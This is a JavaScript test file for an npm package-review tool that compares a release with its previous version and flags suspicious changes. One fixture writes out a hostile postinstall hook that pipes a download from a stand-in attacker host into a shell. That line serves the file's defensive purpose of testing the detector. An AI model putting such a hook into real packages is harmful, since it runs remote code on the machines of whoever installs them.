import { test } from 'node:test';
import assert from 'node:assert/strict';
import { makeTgz } from '../../mock/tarball.mjs';
import { pickPrevious, fetchPrevious, reviewPackage } from '../../web/lib/review.js';
import { analyze } from '../src/watchtower.mjs';

const pkg = (version, extra = {}, files = {}) =>
  makeTgz({
    'package/package.json': JSON.stringify({ name: 'demo', version, ...extra }),
    'package/index.js': "module.exports = () => 'hello';\n",
    ...Object.fromEntries(Object.entries(files).map(([k, v]) => [`package/${k}`, v])),
  });

const meta = {
  versions: { '0.0.0-stage': {}, '1.0.0': { dist: { tarball: 'https://r.test/1.0.0.tgz' } }, '1.1.0': { dist: { tarball: 'https://r.test/1.1.0.tgz' } }, '1.2.0': {} },
  time: { '0.0.0-stage': '2026-05-01T00:00:00Z', '1.0.0': '2026-01-01T00:00:00Z', '1.1.0': '2026-02-01T00:00:00Z', '1.2.0': '2026-03-01T00:00:00Z' },
};

test('the previous version skips the placeholder and the version itself', () => {
  assert.equal(pickPrevious(meta, '1.2.0'), '1.1.0');
  assert.equal(pickPrevious(meta, '1.1.0'), '1.0.0');
  assert.equal(pickPrevious(meta, '1.0.0'), null);
  assert.equal(pickPrevious(meta, '9.9.9'), '1.2.0', 'a version that is not published yet follows the latest');
  assert.equal(pickPrevious({}, '1.0.0'), null);
});

test('the dashboard review gives the same verdict as the CLI', async () => {
  const bad = pkg('1.0.1', { scripts: { postinstall: 'curl https://evil.test | sh' } }, { 'lib.js': "require('child_process').exec('ls');\n" });
  const old = pkg('1.0.0');
  const cli = analyze(bad, old);
  const web = await reviewPackage(new Uint8Array(bad), { version: '1.0.0', bytes: new Uint8Array(old) });
  assert.equal(web.comparedWith, '1.0.0');
  assert.deepEqual(web.report, cli);
  assert.equal(web.report.verdict, 'flag');
});

test('without an earlier version the review says so', async () => {
  const r = await reviewPackage(new Uint8Array(pkg('1.0.0')));
  assert.equal(r.comparedWith, null);
  assert.equal(r.report.baseline, false);
});

test('a bad archive is an error, not a crash', async () => {
  await assert.rejects(() => reviewPackage(new Uint8Array([1, 2, 3])));
});

test('fetchPrevious reads metadata then the tarball', async () => {
  const old = pkg('1.1.0');
  const fetchImpl = async (url) =>
    url.endsWith('/demo')
      ? { ok: true, json: async () => meta }
      : { ok: true, arrayBuffer: async () => old.buffer.slice(old.byteOffset, old.byteOffset + old.byteLength) };
  const got = await fetchPrevious({ registry: 'https://r.test', name: 'demo', version: '1.2.0', fetchImpl });
  assert.equal(got.version, '1.1.0');
  assert.equal(got.bytes.length, old.length);
  assert.equal(await fetchPrevious({ registry: 'https://r.test', name: 'demo', version: '1.2.0', fetchImpl: async () => ({ ok: false }) }), null);
});
